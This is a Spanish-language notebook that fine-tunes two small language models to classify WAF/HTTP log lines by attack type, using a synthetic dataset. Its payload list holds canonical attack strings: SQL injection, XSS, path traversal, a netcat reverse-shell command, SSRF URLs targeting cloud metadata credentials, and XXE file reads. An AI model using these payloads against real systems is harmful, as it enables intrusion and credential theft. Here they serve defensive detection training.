# Fine-tuning de clasificadores de logs de ataques — TinyLlama 1.1B y Qwen3 0.6B (Unsloth, T4)


> **De donde viene este cuaderno.** Es una adaptacion de un cuaderno de fine-tuning de
> `gpt-oss-20b` para razonamiento multilingue (Unsloth + dataset de traducciones). La mecanica
> de Unsloth/LoRA/SFTTrainer se mantiene, pero **el modelo, el dataset y el objetivo cambian
> por completo**:
>
> | | Cuaderno original | Este cuaderno |
> |---|---|---|
> | Modelo | `gpt-oss-20b` (MoE, 20B) | `TinyLlama-1.1B` **y** `Qwen3-0.6B` (densos, chicos) |
> | Dataset | Traducciones de cadenas de razonamiento | Lineas de log HTTP/WAF con y sin ataque |
> | Tarea | Razonar en distintos idiomas | Clasificar el tipo de ataque de una linea de log |
> | Cuello de botella en T4 | VRAM (20B) | Ya no es un problema: los dos modelos entran comodos |
> | Salida del modelo | Texto libre (razonamiento + respuesta) | JSON con `es_ataque`, `tipo`, `confianza` |
>
> Al ser modelos densos y chicos, se elimina toda la maquinaria de fragmentacion/outliers
> del cuaderno original (pensada para no explotar VRAM con un LoRA que matcheaba los 32
> expertos del MoE). Ese ya no es nuestro problema: es simplemente un LoRA sobre un modelo
> chico.


## Objetivo

Entrenar (fine-tunear) **dos** modelos chicos para que clasifiquen mejor lineas de log
de tipo WAF/servidor HTTP como ataque o trafico normal, y dentro de "ataque", identifiquen
el tipo:

- `normal` (trafico benigno)
- `sql_injection`
- `xss`
- `path_traversal`
- `command_injection`
- `ssrf`
- `xxe`

Este cuaderno entrena **TinyLlama-1.1B-Chat** y **Qwen3-0.6B** con el mismo dataset y
compara su accuracy al final. Se conecta con el trabajo previo de benchmarking de estos
mismos dos modelos via prompting + salida estructurada por JSON Schema en Ollama: la
pregunta que responde este cuaderno es si el fine-tuning mejora (y hace mas estable) la
clasificacion frente a depender solo de few-shot prompting en inferencia.

**Orden de uso:** correr todo de arriba a abajo. La celda de instalacion se auto-detecta
(no rompe nada si ya esta todo instalado). El entrenamiento de los dos modelos corre en
secuencia dentro de la misma sesion de Colab — no hace falta reiniciar entre uno y otro.


### Configuracion central

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURACION CENTRAL - ejecutar ANTES de importar torch/unsloth/trl
# ─────────────────────────────────────────────────────────────────────────────
import os

# Reduce la fragmentacion de memoria en la placa.
os.environ["PYTORCH_CUDA_ALLOC_CONF"] = "expandable_segments:True"

# Desde Unsloth 2024.11 los logits del forward vienen VACIOS por defecto
# (optimizacion: si la loss se calcula adentro del modelo, no hace falta
# materializarlos). Pero TRL 0.21 con `dataset_kwargs={"skip_prepare_dataset":
# True}` -que es como pasamos el dataset ya tokenizado- calcula la loss
# AFUERA y necesita los logits crudos. Sin este flag, la primera llamada a
# `trainer.train()` explota con:
#     NotImplementedError: Unsloth: Logits are empty from 2024.11 onwards.
# Lo seteamos aca (antes de cualquier import de unsloth) para que valga
# para toda la sesion.
os.environ["UNSLOTH_RETURN_LOGITS"] = "1"

# ─────────────────────────────────────────────────────────────────────────────
# LARGO MAXIMO DE SECUENCIA
#
# A diferencia del cuaderno de gpt-oss-20b, aca NO hace falta fragmentar el
# dataset: una linea de log + el prompt del sistema + la salida JSON entran
# comodas en unos pocos cientos de tokens. 384 deja margen de sobra.
# ─────────────────────────────────────────────────────────────────────────────
LARGO_MAXIMO = 384

# Semilla para reproducibilidad (generacion del dataset sintetico + splits)
SEMILLA = 3407


### Instalacion (se auto-detecta)

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# INSTALACION - se detecta sola, no depende de un flag manual.
#
# Cada VM de Colab arranca vacia. Esta celda chequea que falta e instala solo
# eso. Si ya esta todo instalado (por ejemplo, corriste esta celda antes y
# reiniciaste sesion), no hace nada.
#
# Las versiones estan PINEADAS a proposito. La combinacion de "ultima version
# de todo" venia rompiendo la tokenizacion del dataset dentro de SFTTrainer
# con un TypeError de pickling (dill no puede serializar la tokenize_fn de
# TRL nuevo bajo Python 3.13, y datasets termina yendo al camino de
# multiprocessing igual). Estas versiones son las ultimas conocidas que se
# llevan bien entre si sobre la imagen actual de Colab con T4.
#
# torchao va pineado porque la version 0.10.0 que trae Colab dispara un
# ImportError adentro de peft al cargar Qwen3 en 4bit ("Found version 0.10.0,
# but only versions above 0.16.0 are supported"). TinyLlama no lo pega
# porque va por otra ruta de peft.
# ─────────────────────────────────────────────────────────────────────────────
import importlib.util

def _falta(pkg):
    return importlib.util.find_spec(pkg) is None

FALTA_ALGO = _falta("unsloth") or _falta("bitsandbytes")

if FALTA_ALGO:
    print("Entorno nuevo detectado. Instalando (unos minutos)...")
    import os
    !pip install --upgrade -qqq uv
    !uv pip install -qqq --no-deps bitsandbytes hf_transfer
    !uv pip install -qqq \
        "unsloth==2025.9.1" \
        "unsloth_zoo==2025.9.1" \
        "transformers==4.56.0" \
        "trl==0.21.0" \
        "datasets==3.6.0" \
        "torchao>=0.16.0" \
        scikit-learn
    print()
    print("Instalado. AHORA: Entorno de ejecucion -> Reiniciar sesion,")
    print("y segui corriendo desde la celda de verificacion (la siguiente).")
    print("No corras esta celda de nuevo despues de reiniciar: ya no hace falta.")
else:
    print("unsloth y bitsandbytes ya estan instalados en esta VM. Nada que hacer.")


### Verificacion del entorno

In [3]:
# ─────────────────────────────────────────────────────────────────────────────
# VERIFICACION DEL ENTORNO - correr SIEMPRE antes de cargar los modelos.
#
# Con TinyLlama-1.1B y Qwen3-0.6B ya no estamos al limite de VRAM de una T4
# como con el 20B, pero seguimos necesitando bitsandbytes: sin el,
# load_in_4bit se ignora en silencio.
# ─────────────────────────────────────────────────────────────────────────────
import torch

print("GPU:", torch.cuda.get_device_name(0) if torch.cuda.is_available() else "SIN GPU")
print("torch:", torch.__version__)
print()

bloqueantes = []

try:
    import bitsandbytes
    print("bitsandbytes  ", bitsandbytes.__version__, " -> 4bit disponible")
except ImportError:
    print("bitsandbytes   AUSENTE")
    bloqueantes.append(
        "bitsandbytes no esta instalado. Arreglo:\n"
        "  !uv pip install -qqq --no-deps bitsandbytes\n"
        "  y despues REINICIAR SESION."
    )

if not torch.cuda.is_available():
    bloqueantes.append("No se detecto GPU. Entorno de ejecucion -> Cambiar tipo de entorno -> GPU (T4).")

if bloqueantes:
    print("\n--- HAY QUE RESOLVER ESTO ANTES DE SEGUIR ---")
    for b in bloqueantes:
        print("-", b)
else:
    print("\nOK para seguir.")


GPU: Tesla T4
torch: 2.11.0+cu128

bitsandbytes   0.50.2  -> 4bit disponible

OK para seguir.


<a name="Data"></a>
### Preparacion de datos: dataset sintetico de logs HTTP/WAF

No usamos un dataset de traducciones: generamos lineas de log estilo
Apache/Nginx/WAF (formato "combined") con payloads representativos de cada
categoria, mezcladas con trafico benigno. Los payloads son los ejemplos
canonicos que se ensenan en cualquier curso de seguridad web / OWASP (no son
exploits funcionales, son los patrones sintacticos que un WAF esta entrenado
para reconocer).

**Por que sintetico y no un dataset "real" descargado:** para que este
cuaderno corra de punta a punta sin depender de un dataset externo (con su
licencia, tamano de descarga, columnas propias, etc.). Si en ITBA ya tienen
logs reales (o un dataset como CSIC 2010, o los logs que uso el proyecto de
clasificacion de WAF con Ollama), el reemplazo es directo: lo unico que le
importa a las celdas de mas abajo es terminar con un `Dataset` de HuggingFace
con columnas `mensaje_usuario` (la linea de log) y `etiqueta` (el JSON
esperado) — el generador de abajo es un `reemplazable`, no una dependencia
dura del resto del cuaderno.

**Categorias:**

| Categoria | Que representa |
|---|---|
| `normal` | Trafico benigno: paths y query strings legitimos |
| `sql_injection` | Intentos de inyeccion SQL en parametros |
| `xss` | Cross-site scripting reflejado en parametros |
| `path_traversal` | Intentos de acceder a archivos fuera del root (`../../etc/passwd`) |
| `command_injection` | Inyeccion de comandos de shell en parametros |
| `ssrf` | Server-Side Request Forgery (URLs a metadata de nube, localhost, etc.) |
| `xxe` | XML External Entity en cuerpos XML |


In [4]:
import random
import json
from datasets import Dataset

random.seed(SEMILLA)

# ─────────────────────────────────────────────────────────────────────────────
# Payloads de referencia por categoria. Son los ejemplos canonicos de OWASP /
# cualquier curso de seguridad web — sirven para que el clasificador aprenda
# el PATRON, no para explotar nada.
# ─────────────────────────────────────────────────────────────────────────────
PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1' --",
        "' OR 1=1#",
        "admin'--",
        "1' UNION SELECT username, password FROM users--",
        "1; DROP TABLE users--",
        "' AND SLEEP(5)--",
        "' OR 'a'='a",
        "1 OR 1=1",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(document.cookie)</script>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('xss')>",
        "javascript:alert(1)",
    ],
    "path_traversal": [
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//boot.ini",
        "../../../windows/win.ini",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/../../../etc/shadow",
    ],
    "command_injection": [
        "; cat /etc/passwd",
        "| whoami",
        "&& id",
        "`id`",
        "; ping -c 3 127.0.0.1",
        "| nc -e /bin/sh 10.0.0.1 4444",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://127.0.0.1:6379/",
        "http://localhost:22",
        "file:///etc/passwd",
        "http://[::1]:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY x SYSTEM \"http://169.254.169.254/\">]><data>&x;</data>",
    ],
}

# Parametros y paths legitimos para trafico normal
PATHS_NORMALES = [
    "/api/productos", "/api/usuarios/{id}", "/checkout", "/login",
    "/buscar", "/static/logo.png", "/api/pedidos/{id}/estado",
    "/perfil", "/carrito", "/api/categorias", "/health", "/favicon.ico",
]
PARAMS_NORMALES = [
    "id={id}", "pagina={pag}", "orden=precio_asc", "q=notebook",
    "categoria=electronica", "lang=es", "moneda=ARS", "session={sid}",
]

# Paths "objetivo" donde tiene sentido ver el payload inyectado
PATHS_VULNERABLES = [
    "/api/productos", "/buscar", "/login", "/api/usuarios",
    "/comentarios", "/api/pedidos", "/upload", "/perfil/editar",
]

METODOS = ["GET", "GET", "GET", "POST", "POST"]
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0",
    "curl/8.4.0",
    "python-requests/2.31.0",
    "sqlmap/1.7#stable",
]

def ip_random():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def fecha_random():
    dia = random.randint(1, 28)
    mes = random.choice(["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug"])
    hh, mm, ss = random.randint(0,23), random.randint(0,59), random.randint(0,59)
    return f"{dia:02d}/{mes}/2026:{hh:02d}:{mm:02d}:{ss:02d} -0300"

def linea_log(metodo, path_y_query, status, ua):
    ip = ip_random()
    fecha = fecha_random()
    size = random.randint(200, 15000)
    return f'{ip} - - [{fecha}] "{metodo} {path_y_query} HTTP/1.1" {status} {size} "-" "{ua}"'

def generar_ejemplo_normal():
    path = random.choice(PATHS_NORMALES).format(id=random.randint(1,9999))
    n_params = random.randint(0, 3)
    params = random.sample(PARAMS_NORMALES, n_params)
    params = [p.format(id=random.randint(1,999), pag=random.randint(1,20),
                        sid="".join(random.choices("abcdef0123456789", k=16)))
              for p in params]
    query = ("?" + "&".join(params)) if params else ""
    metodo = random.choice(METODOS)
    log = linea_log(metodo, path + query, random.choice([200,200,200,201,304]), random.choice(UAS))
    return log, {"es_ataque": False, "tipo": "normal", "confianza": "alta"}

def generar_ejemplo_ataque(tipo):
    payload = random.choice(PAYLOADS[tipo])
    path = random.choice(PATHS_VULNERABLES)
    ua = random.choice(UAS)

    if tipo == "xxe":
        # el payload XML va en el cuerpo, pero lo dejamos ver en la linea de
        # log resumida (muchos WAF loguean un extracto del body en el campo
        # de request cuando matchea una regla)
        log = linea_log("POST", f"{path} HTTP/1.1\" body=\"{payload}", 403, ua)
    elif tipo == "command_injection":
        param = random.choice(["cmd", "host", "file", "input", "q"])
        log = linea_log(random.choice(["GET","POST"]), f"{path}?{param}={payload}", 403, ua)
    elif tipo == "ssrf":
        param = random.choice(["url", "callback", "webhook", "image_url"])
        log = linea_log(random.choice(["GET","POST"]), f"{path}?{param}={payload}", 403, ua)
    else:
        param = random.choice(["id", "q", "search", "username", "comment", "file"])
        log = linea_log(random.choice(["GET","POST"]), f"{path}?{param}={payload}", 403, ua)

    confianza = "alta" if tipo in ("sql_injection", "xss", "path_traversal") else "media"
    return log, {"es_ataque": True, "tipo": tipo, "confianza": confianza}

def construir_dataset(n_por_categoria_ataque=180, n_normales=650):
    filas = []
    for tipo in PAYLOADS:
        for _ in range(n_por_categoria_ataque):
            log, etiqueta = generar_ejemplo_ataque(tipo)
            filas.append((log, etiqueta))
    for _ in range(n_normales):
        log, etiqueta = generar_ejemplo_normal()
        filas.append((log, etiqueta))
    random.shuffle(filas)
    return filas

filas = construir_dataset()
print(f"Total de ejemplos generados: {len(filas)}")

from collections import Counter
conteo = Counter(e["tipo"] for _, e in filas)
for tipo, n in sorted(conteo.items()):
    print(f"  {tipo:<20} {n}")


Total de ejemplos generados: 1730
  command_injection    180
  normal               650
  path_traversal       180
  sql_injection        180
  ssrf                 180
  xss                  180
  xxe                  180


In [5]:
# Vistazo rapido
for log, etiqueta in filas[:5]:
    print(log)
    print(" ->", json.dumps(etiqueta, ensure_ascii=False))
    print()


201.176.43.230 - - [23/Jan/2026:04:32:35 -0300] "GET /api/usuarios?search=/../../../etc/shadow HTTP/1.1" 403 674 "-" "python-requests/2.31.0"
 -> {"es_ataque": true, "tipo": "path_traversal", "confianza": "alta"}

209.149.21.64 - - [07/Jan/2026:09:29:18 -0300] "POST /api/productos HTTP/1.1" body="<?xml version="1.0"?><!DOCTYPE data [<!ENTITY x SYSTEM "http://169.254.169.254/">]><data>&x;</data> HTTP/1.1" 403 6529 "-" "sqlmap/1.7#stable"
 -> {"es_ataque": true, "tipo": "xxe", "confianza": "media"}

206.95.100.168 - - [26/Jul/2026:15:12:40 -0300] "POST /api/productos HTTP/1.1" 201 13330 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0"
 -> {"es_ataque": false, "tipo": "normal", "confianza": "alta"}

33.141.247.154 - - [19/Apr/2026:01:50:24 -0300] "GET /favicon.ico?lang=es&categoria=electronica&moneda=ARS HTTP/1.1" 304 5691 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 -> {"es_ataque": false, "tipo": "normal", "confianza": "alta"}

79.35.176.231 - - 

### Split train/test y prompt del sistema

Separamos 15% para test (estratificado por categoria, a mano, ya que el
dataset es chico y generado por nosotros). El prompt de sistema es el mismo
para los dos modelos: es la parte que en el enfoque anterior (Ollama +
few-shot) vivia en el prompt de cada llamada; ahora se la "graba" en los
pesos via fine-tuning, y en inferencia alcanza con un prompt de sistema
corto (o ninguno).


In [6]:
SYSTEM_PROMPT = (
    "Sos un clasificador de seguridad para logs de un WAF. Dada una linea de "
    "log HTTP, respondes SOLO con un JSON de la forma "
    '{"es_ataque": bool, "tipo": "normal|sql_injection|xss|path_traversal|'
    'command_injection|ssrf|xxe", "confianza": "alta|media|baja"}. '
    "No agregues texto fuera del JSON."
)

def split_train_test(filas, frac_test=0.15, semilla=SEMILLA):
    por_tipo = {}
    for log, etiqueta in filas:
        por_tipo.setdefault(etiqueta["tipo"], []).append((log, etiqueta))

    rnd = random.Random(semilla)
    train, test = [], []
    for tipo, ejemplos in por_tipo.items():
        rnd.shuffle(ejemplos)
        n_test = max(1, int(len(ejemplos) * frac_test))
        test.extend(ejemplos[:n_test])
        train.extend(ejemplos[n_test:])
    rnd.shuffle(train)
    rnd.shuffle(test)
    return train, test

train_filas, test_filas = split_train_test(filas)
print(f"Train: {len(train_filas)}  |  Test: {len(test_filas)}")


Train: 1471  |  Test: 259


### De filas (log, etiqueta) a `Dataset` con mensajes tipo chat

In [7]:
def filas_a_dataset(filas):
    mensajes = []
    for log, etiqueta in filas:
        mensajes.append({
            "messages": [
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": log},
                {"role": "assistant", "content": json.dumps(etiqueta, ensure_ascii=False)},
            ],
            # se guarda aparte para la evaluacion (no se usa en el entrenamiento)
            "log": log,
            "tipo_esperado": etiqueta["tipo"],
            "es_ataque_esperado": etiqueta["es_ataque"],
        })
    return Dataset.from_list(mensajes)

dataset_train = filas_a_dataset(train_filas)
dataset_test = filas_a_dataset(test_filas)
dataset_train, dataset_test


(Dataset({
     features: ['messages', 'log', 'tipo_esperado', 'es_ataque_esperado'],
     num_rows: 1471
 }),
 Dataset({
     features: ['messages', 'log', 'tipo_esperado', 'es_ataque_esperado'],
     num_rows: 259
 }))

<a name="Train"></a>
## Entrenar los dos modelos

En vez de duplicar todas las celdas de carga/LoRA/entrenamiento para cada
modelo (como pasaria si copiabamos el cuaderno original dos veces), definimos
**una funcion** `entrenar_y_evaluar(cfg)` que hace todo el ciclo para un
modelo, y la llamamos una vez por cada entrada de `MODELOS`. Esto entrena
`TinyLlama-1.1B` y `Qwen3-0.6B` **en la misma sesion** de Colab, uno despues
del otro, liberando la VRAM entre medio.

**Marcadores de instruccion/respuesta:** cada modelo trae su propia plantilla
de chat (Zephyr para TinyLlama, ChatML-like para Qwen3), asi que el texto que
delimita "aca empieza la respuesta del asistente" es distinto en cada uno.
`train_on_responses_only` necesita ese marcador exacto para enmascarar
correctamente el system+user y entrenar solo sobre la respuesta JSON.


In [8]:
MODELOS = [
    {
        "key": "tinyllama-1.1b",
        "model_id": "unsloth/tinyllama-chat-bnb-4bit",
        "instruction_part": "<|user|>\n",
        "response_part": "<|assistant|>\n",
        "chat_kwargs": {},
    },
    {
        "key": "qwen3-0.6b",
        "model_id": "unsloth/Qwen3-0.6B-unsloth-bnb-4bit",
        "instruction_part": "<|im_start|>user\n",
        "response_part": "<|im_start|>assistant\n",
        # Qwen3 tiene modo "thinking"; lo desactivamos para entrenar
        # directamente sobre la respuesta JSON, sin bloque <think>.
        "chat_kwargs": {"enable_thinking": False},
    },
]

print("Modelos a entrenar en esta corrida:")
for m in MODELOS:
    print(" -", m["key"], "->", m["model_id"])


Modelos a entrenar en esta corrida:
 - tinyllama-1.1b -> unsloth/tinyllama-chat-bnb-4bit
 - qwen3-0.6b -> unsloth/Qwen3-0.6B-unsloth-bnb-4bit


### Verificar los marcadores de plantilla antes de entrenar

Antes de lanzar el entrenamiento, conviene chequear a ojo que el
`instruction_part`/`response_part` de cada modelo realmente aparece tal cual
en el texto que arma `apply_chat_template`. Si `unsloth`/`transformers`
actualiza la plantilla de alguno de estos modelos, esta celda es la forma
mas rapida de darse cuenta antes de perder tiempo entrenando con una mascara
mal puesta.


In [9]:
from transformers import AutoTokenizer

for cfg in MODELOS:
    tok = AutoTokenizer.from_pretrained(cfg["model_id"])
    ejemplo = dataset_train[0]["messages"]
    texto = tok.apply_chat_template(ejemplo, tokenize=False, add_generation_prompt=False,
                                     **cfg["chat_kwargs"])
    ok_instr = cfg["instruction_part"] in texto
    ok_resp = cfg["response_part"] in texto
    print(f"{cfg['key']:<15} instruction_part {'OK' if ok_instr else chr(0x274c)+chr(32)+'NO ENCONTRADO'}"
          f"   response_part {'OK' if ok_resp else chr(0x274c)+chr(32)+'NO ENCONTRADO'}")
    if not (ok_instr and ok_resp):
        print("----- texto renderizado, para ajustar los marcadores a mano -----")
        print(texto)
    del tok


config.json:   0%|          | 0.00/1.24k [00:00<?, ?B/s]

tokenizer_config.json:   0%|          | 0.00/1.37k [00:00<?, ?B/s]

tokenizer.model: reconstructing file:   0%|          |  0.00B /  500kB            

tokenizer.model: downloading bytes:           |  0.00B            

tokenizer.json:   0%|          | 0.00/1.84M [00:00<?, ?B/s]

...

tokenizer.json: downloading bytes:           |  0.00B            

added_tokens.json:   0%|          | 0.00/707 [00:00<?, ?B/s]

special_tokens_map.json:   0%|          | 0.00/614 [00:00<?, ?B/s]

chat_template.jinja:   0%|          | 0.00/4.91k [00:00<?, ?B/s]

qwen3-0.6b      instruction_part OK   response_part OK


### La funcion que entrena y evalua un modelo

Pasos, para cada modelo:

1. Cargar en 4bit con `FastLanguageModel.from_pretrained`.
2. Agregar adaptadores LoRA (`r=16`, sobre **todas** las proyecciones lineales
   — a diferencia del cuaderno de `gpt-oss-20b`, aca no hay MoE ni riesgo de
   que el LoRA explote en parametros, asi que no hace falta restringir a
   solo atencion).
3. Puerta de control: si por algun motivo el LoRA da sospechosamente grande,
   frenar antes de gastar tiempo de GPU (misma logica de seguridad que el
   cuaderno original, con un umbral mas laxo porque el modelo base es chico).
4. Tokenizar el dataset con `preparar_dataset`, que ademas arma los labels
   con -100 en todo el prompt (system+user) y deja solo la respuesta del
   asistente como target de la loss. Antes esto lo hacia
   `train_on_responses_only` de unsloth, pero en Python 3.13 su ruta interna
   de multiprocessing rompia con `BufferError` y el matching por tokens de
   las marcas de plantilla dejaba todo enmascarado; aca lo hacemos a mano,
   con `num_proc=1` y sin depender del texto de las marcas.
5. Entrenar con `SFTTrainer`, pasandole el dataset ya tokenizado y
   `dataset_kwargs={"skip_prepare_dataset": True}` para que no lo vuelva a
   procesar.
6. Evaluar en el set de test: generar el JSON para cada log y comparar
   `tipo` y `es_ataque` contra lo esperado.
7. Guardar el adaptador LoRA en disco.
8. Liberar el modelo de la GPU antes de pasar al siguiente.


In [ ]:
import gc
import re
import inspect
from trl import SFTConfig, SFTTrainer
from unsloth import FastLanguageModel
try:
    from unsloth import is_bfloat16_supported
except ImportError:
    import torch
    def is_bfloat16_supported():
        return torch.cuda.is_available() and torch.cuda.is_bf16_supported()


def preparar_dataset(dataset, tokenizer, chat_kwargs):
    """
    Tokeniza cada conversacion y arma los labels enmascarando con -100 todo
    el prompt (system + user), para que la loss se calcule SOLO sobre la
    respuesta del asistente.

    Antes esto lo hacia `train_on_responses_only` de unsloth, que busca los
    marcadores de la plantilla dentro de la secuencia de tokens. En Python
    3.13 eso venia fallando por dos motivos al mismo tiempo:
      - `train_on_responses_only` hace por dentro `dataset.map(num_proc=2)`,
        y ese multiprocessing dispara `BufferError: Existing exports of
        data` en la version de `datasets` que trae Colab.
      - el matching por tokens de las marcas fallaba (BPE puede tokenizar
        una misma cadena distinto segun el contexto de los alrededores), y
        el resultado era que TODOS los labels quedaban en -100 y el
        entrenamiento abortaba con `ZeroDivisionError`.

    Cortamos por lo sano: renderizamos aparte el prompt (system+user) con
    `add_generation_prompt=True` para saber exactamente donde termina la
    parte a enmascarar, y de ahi para adelante dejamos los labels iguales
    a los input_ids. Sin multiprocessing, sin buscar marcas de texto.
    """
    def _tokenize(ejemplo):
        mensajes = ejemplo["messages"]
        prompt_texto = tokenizer.apply_chat_template(
            mensajes[:-1], tokenize=False, add_generation_prompt=True,
            **chat_kwargs,
        )
        completo_texto = tokenizer.apply_chat_template(
            mensajes, tokenize=False, add_generation_prompt=False,
            **chat_kwargs,
        )
        prompt_ids = tokenizer(prompt_texto, add_special_tokens=False)["input_ids"]
        completo_ids = tokenizer(completo_texto, add_special_tokens=False)["input_ids"]

        input_ids = completo_ids[:LARGO_MAXIMO]
        n_prompt = min(len(prompt_ids), len(input_ids))
        labels = [-100] * n_prompt + list(input_ids[n_prompt:])
        labels = labels[:LARGO_MAXIMO]
        attention_mask = [1] * len(input_ids)
        return {
            "input_ids": input_ids,
            "attention_mask": attention_mask,
            "labels": labels,
        }

    cols_a_borrar = dataset.column_names
    return dataset.map(_tokenize, batched=False, num_proc=1,
                        remove_columns=cols_a_borrar)


def extraer_json(texto_generado):
    """Busca el primer bloque {...} en el texto generado y lo parsea."""
    match = re.search(r"\{.*\}", texto_generado, re.DOTALL)
    if not match:
        return None
    try:
        return json.loads(match.group(0))
    except json.JSONDecodeError:
        return None


def evaluar_modelo(model, tokenizer, dataset_test, chat_kwargs, max_ejemplos=None):
    FastLanguageModel.for_inference(model)
    n = len(dataset_test) if max_ejemplos is None else min(max_ejemplos, len(dataset_test))

    aciertos_tipo = 0
    aciertos_binario = 0
    fallos_parseo = 0
    detalle = []

    for i in range(n):
        ejemplo = dataset_test[i]
        mensajes = [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": ejemplo["log"]},
        ]
        inputs = tokenizer.apply_chat_template(
            mensajes, add_generation_prompt=True, return_tensors="pt",
            return_dict=True, **chat_kwargs,
        ).to(model.device)

        with torch.no_grad():
            salida = model.generate(**inputs, max_new_tokens=80, do_sample=False)

        texto = tokenizer.decode(salida[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
        pred = extraer_json(texto)

        if pred is None or "tipo" not in pred or "es_ataque" not in pred:
            fallos_parseo += 1
            detalle.append((ejemplo["log"], ejemplo["tipo_esperado"], None, texto))
            continue

        if pred["tipo"] == ejemplo["tipo_esperado"]:
            aciertos_tipo += 1
        if bool(pred["es_ataque"]) == bool(ejemplo["es_ataque_esperado"]):
            aciertos_binario += 1
        detalle.append((ejemplo["log"], ejemplo["tipo_esperado"], pred.get("tipo"), texto))

    return {
        "n_evaluados": n,
        "accuracy_tipo": aciertos_tipo / n,
        "accuracy_binaria": aciertos_binario / n,
        "fallos_parseo": fallos_parseo,
        "detalle": detalle,
    }


def entrenar_y_evaluar(cfg, dataset_train, dataset_test, pasos_demo=60, max_ejemplos_eval=None):
    print("=" * 70)
    print("Modelo:", cfg["key"], "->", cfg["model_id"])
    print("=" * 70)

    model, tokenizer = FastLanguageModel.from_pretrained(
        model_name=cfg["model_id"],
        dtype=None,
        max_seq_length=LARGO_MAXIMO,
        load_in_4bit=True,
        full_finetuning=False,
    )

    model = FastLanguageModel.get_peft_model(
        model,
        r=16,
        target_modules=["q_proj", "k_proj", "v_proj", "o_proj",
                         "gate_proj", "up_proj", "down_proj"],
        lora_alpha=16,
        lora_dropout=0,
        bias="none",
        use_gradient_checkpointing="unsloth",
        random_state=SEMILLA,
        use_rslora=False,
        loftq_config=None,
    )

    # --- puerta de control ---
    entrenables = sum(p.numel() for p in model.parameters() if p.requires_grad)
    totales = sum(p.numel() for p in model.parameters())
    print(f"Parametros entrenables: {entrenables:,} / {totales:,} totales")
    assert entrenables < 100_000_000, (
        f"LoRA sospechosamente grande para un modelo de este tamano "
        f"({entrenables:,} parametros). Revisa target_modules."
    )

    ds_train_tok = preparar_dataset(dataset_train, tokenizer, cfg["chat_kwargs"])

    # Puerta de control: si la mascara quedo mal armada (por ej. la plantilla
    # de chat de este modelo renderiza el turno del asistente de otra forma),
    # el primer ejemplo tendria TODOS los labels en -100. Fallar temprano y
    # con un mensaje claro es mejor que llegar al ZeroDivisionError de unsloth.
    ejemplo0 = ds_train_tok[0]
    utiles0 = sum(1 for l in ejemplo0["labels"] if l != -100)
    print(f"Tokens con label util en el primer ejemplo: {utiles0}/{len(ejemplo0['labels'])}")
    assert utiles0 > 0, (
        "El primer ejemplo quedo con TODOS los labels en -100. "
        "Revisar preparar_dataset() y la plantilla de este modelo."
    )

    # ─────────────────────────────────────────────────────────────────────
    # Compatibilidad entre versiones de TRL: en TRL viejo el parametro de
    # SFTConfig se llama `max_seq_length`; en TRL nuevo lo renombraron a
    # `max_length`. Elegimos el nombre correcto mirando la firma real en
    # esta instalacion, en vez de hardcodear uno solo.
    # ─────────────────────────────────────────────────────────────────────
    args_sftconfig = dict(
        per_device_train_batch_size=4,
        gradient_accumulation_steps=2,
        num_train_epochs=2,
        max_steps=pasos_demo if pasos_demo else -1,
        packing=False,
        learning_rate=2e-4,
        warmup_steps=10,
        lr_scheduler_type="cosine",
        optim="adamw_8bit",
        logging_steps=10,
        seed=SEMILLA,
        output_dir=f"outputs_{cfg['key']}",
        report_to="none",
        dataset_num_proc=1,
        # El dataset ya viene tokenizado (input_ids/attention_mask/labels)
        # con la mascara puesta a mano. Le decimos a TRL que NO lo vuelva
        # a preparar, para evitar el camino de multiprocessing de datasets
        # que rompe en Python 3.13.
        dataset_kwargs={"skip_prepare_dataset": True},
        # T4 (Turing, CUDA 7.5) NO soporta bf16: solo GPUs Ampere+ (8.0+).
        # Elegimos fp16/bf16 segun lo que soporte la GPU actual para evitar
        # el ValueError 'Your setup doesn't support bf16/gpu'.
        fp16=not is_bfloat16_supported(),
        bf16=is_bfloat16_supported(),
    )
    parametros_validos = inspect.signature(SFTConfig.__init__).parameters
    if "max_seq_length" in parametros_validos:
        args_sftconfig["max_seq_length"] = LARGO_MAXIMO
    elif "max_length" in parametros_validos:
        args_sftconfig["max_length"] = LARGO_MAXIMO
    else:
        print("AVISO: no se encontro max_seq_length ni max_length en SFTConfig; "
              "se usa el default de esta version de TRL.")

    args = SFTConfig(**args_sftconfig)

    # Compatibilidad TRL: en versiones viejas SFTTrainer recibe `tokenizer`,
    # en TRL nuevo (5.x) se renombro a `processing_class`. Elegimos el nombre
    # correcto mirando la firma real en vez de hardcodear uno.
    args_sfttrainer = dict(
        model=model,
        train_dataset=ds_train_tok,
        args=args,
    )
    params_trainer = inspect.signature(SFTTrainer.__init__).parameters
    if "processing_class" in params_trainer:
        args_sfttrainer["processing_class"] = tokenizer
    elif "tokenizer" in params_trainer:
        args_sfttrainer["tokenizer"] = tokenizer
    else:
        print("AVISO: SFTTrainer no acepta tokenizer ni processing_class; "
              "se omite y se usa el default.")

    trainer = SFTTrainer(**args_sfttrainer)

    gc.collect()
    torch.cuda.empty_cache()

    stats = trainer.train()
    print(f"Entrenamiento: {stats.metrics['train_runtime']:.1f}s "
